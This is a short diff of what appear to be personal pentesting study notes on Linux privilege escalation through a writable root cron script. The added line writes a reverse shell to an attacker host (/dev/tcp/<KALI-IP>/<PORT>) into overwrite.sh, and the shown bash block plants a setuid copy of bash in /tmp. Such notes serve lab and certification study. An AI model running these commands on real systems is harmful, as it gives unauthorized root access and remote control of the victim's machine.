@@ -891,6 +891,7 @@ whoami
 8. cronjob cron file overwrite
 - Detection: cat /etc/crontab, find cron job that run every 1-2 min as root
 - 'locate overwrite.sh' to overwrite the script in overwrite.sh (usually found in user’s home directory)
+- we can also overwrite to get reverse shell instead of getting local shell using ----  echo "bash -i >& /dev/tcp/<KALI-IP>/<PORT> 0>&1" > overwrite.sh
 ```bash
 echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh            # if overwrite.sh doesn’t exist, make it exist
 chmod +x /home/user/overwrite.sh
